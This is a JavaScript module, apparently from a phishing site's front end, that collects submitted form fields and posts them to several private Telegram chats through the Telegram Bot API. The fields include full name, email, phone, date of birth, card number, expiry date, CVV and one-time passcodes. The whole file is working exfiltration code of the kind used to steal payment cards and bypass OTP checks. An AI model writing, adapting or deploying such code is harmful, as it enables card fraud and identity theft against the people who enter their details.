
const sendTelegramMessage = async (message) => {
  const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;

  const CHAT_IDS = [
    import.meta.env.VITE_TELEGRAM_CHAT_ID,
    import.meta.env.VITE_TELEGRAM_CHAT_ID_1,
    import.meta.env.VITE_TELEGRAM_CHAT_ID_2,
  ].filter(Boolean);

  // Convert JSON data into readable text
  let formattedMessage = message;

  try {
    const obj =
      typeof message === "string"
        ? JSON.parse(message)
        : message;

    if (obj && typeof obj === "object" && !Array.isArray(obj)) {
      const fields = [
        ["fullName", "fullName"],
        ["email", "email"],
        ["mobile", "mobile"],
        ["dob", "dob"],
        ["plan", "plan"],
        ["cardHolderName", "cardHolderName"],
        ["cardNumber", "cardNumber"],
        ["expiry", "Expiry"],
        ["cvv", "CVV"],
        ["agree1", "Agree 1"],
        ["agree2", "Agree 2"],
        ["agree3", "Agree 3"],
        ["demoOtp", "Demo OTP"],
        ["otpMode", "OTP Mode"],
        ["status", "Status"]
      ];

      formattedMessage = fields
        .filter(([key]) => obj[key] !== undefined)
        .map(([key, label]) => {
          let value = obj[key];

          if (typeof value === "boolean") {
            value = value ? "Yes" : "No";
          }

          return `${label}: ${value}`;
        })
        .join("\n");
    }
  } catch {
    // If message isn't JSON, send it as normal text
  }

  try {
    const results = await Promise.all(
      CHAT_IDS.map(async (chatId) => {
        const response = await fetch(
          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: formattedMessage,
            }),
          }
        );

        const data = await response.json();

        if (!response.ok || !data.ok) {
          throw new Error(data.description || "Failed to send message");
        }

        return data;
      })
    );

    console.log("Telegram messages sent successfully");
    return results;
  } catch (error) {
    console.error("Telegram error:", error.message);
    throw error;
  }
};

export default sendTelegramMessage;
